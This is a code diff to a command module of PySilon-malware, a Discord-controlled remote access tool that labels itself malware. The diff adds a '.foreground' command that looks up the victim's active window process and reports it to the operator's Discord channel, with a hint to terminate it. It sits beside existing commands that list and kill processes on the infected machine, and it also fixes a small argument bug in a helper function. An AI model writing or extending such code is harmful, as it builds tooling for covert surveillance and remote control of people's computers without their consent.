@@ -1,5 +1,7 @@
-from psutil import process_iter
+from psutil import process_iter, Process
 from resources.misc import *
+from win32process import GetWindowThreadProcessId
+from win32gui import GetForegroundWindow
 # end of imports
 # on reaction add
 elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you really want to kill process: ':
@@ -103,6 +105,23 @@ elif message.content[:5] == '.show':
             #.log Sent footer message of processes list 
             processes_messages.append(reaction_msg)
             await reaction_msg.add_reaction('🔴')
+elif message.content == '.foreground':
+    #.log Message is "get foreground window process name"
+    await message.delete()
+    #.log Removed the message
+    foreground_process = active_window_process_name()
+    if foreground_process == None:
+        #.log Failed to get foreground window process name
+        embed = discord.Embed(title="📛 Error",description='```Failed to get foreground window process name.```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        #.log Sent message about failure
+    else:
+        #.log Successfully obtained foreground window process name
+        embed = discord.Embed(title=str(foreground_process),description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        #.log Sent message with the process name
 elif message.content[:5] == '.kill':
     #.log Message is "kill a process" 
     await message.delete()
@@ -166,6 +185,13 @@ elif message.content[:5] == '.kill':
 # anywhere
 def check_int(to_check):
     try:
-        asd = int(message.content[6:]) + 1
+        asd = int(to_check) + 1
         return True
     except: return False
+
+def active_window_process_name():
+    try:
+        pid = GetWindowThreadProcessId(GetForegroundWindow())
+        return(Process(pid[-1]).name())
+    except:
+        return None
